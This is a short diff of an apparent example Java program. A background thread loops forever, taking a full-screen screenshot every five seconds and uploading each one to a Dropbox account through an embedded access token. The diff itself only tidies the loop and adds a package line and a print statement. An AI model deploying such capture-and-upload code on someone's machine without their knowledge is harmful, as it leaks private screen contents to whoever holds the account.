@@ -1,3 +1,5 @@
+package exampleFirst;
+
 import com.dropbox.core.DbxException;
 import com.dropbox.core.DbxRequestConfig;
 import com.dropbox.core.v2.DbxClientV2;
@@ -20,7 +22,7 @@ public class MyThread extends Thread {
         DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
         DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
 
-        for (; ; ) {
+        while (true) {
             BufferedImage image = null;
             try {
                 image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
@@ -30,13 +32,14 @@ public class MyThread extends Thread {
 
                 ByteArrayOutputStream os = new ByteArrayOutputStream();
 
-                ImageIO.write(image,  "png", os);
+                ImageIO.write(image, "png", os);
                 byte[] bytes = os.toByteArray();
                 InputStream in = new ByteArrayInputStream(bytes);
 
                 client.files().uploadBuilder("/" + date + ".png").uploadAndFinish(in);
 
                 sleep(5000);
+                System.out.println(date + ".png");
 
             } catch (AWTException e) {
                 e.printStackTrace();
